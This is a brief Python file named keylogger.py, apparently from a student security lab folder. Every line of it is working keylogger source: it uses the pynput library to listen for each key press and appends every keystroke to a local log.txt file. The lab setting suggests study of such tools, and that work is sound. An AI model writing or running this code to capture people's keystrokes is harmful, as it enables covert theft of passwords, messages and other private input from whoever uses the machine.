# filepath: /home/nihalzown/Documents/GitHub/class/s4-class/ssl-lab/keylogger.py
from pynput.keyboard import Key, Listener

def on_press(key):
    with open('log.txt', 'a') as f:
        f.write(str(key) + '\n')

with Listener(on_press=on_press) as listener:
    listener.join()